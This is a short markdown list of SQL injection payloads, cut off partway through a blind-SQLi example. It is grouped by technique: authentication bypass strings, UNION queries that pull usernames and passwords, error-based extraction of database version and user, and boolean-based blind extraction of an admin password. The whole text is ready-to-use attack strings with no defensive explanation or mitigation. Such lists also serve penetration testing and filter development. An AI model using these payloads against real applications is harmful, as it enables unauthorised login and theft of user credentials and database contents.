

# SQL Injection (SQLi) Payloads List

Below is a collection of common SQL injection payloads categorized by attack type and database technology.

## Basic Authentication Bypass

```
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
admin' OR '1'='1
```

## Union-Based Attacks

```
UNION SELECT null,username,password FROM users--
UNION SELECT 1,2,3,4--
UNION ALL SELECT database(),user(),version()--
```

## Error-Based Attacks

```
AND (SELECT 0 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0)
EXTRACTVALUE(rand(),concat(0x3a,(select database())))
```

## Boolean-Based Blind SQLi

```
AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
AND ASCII(SUBSTRING((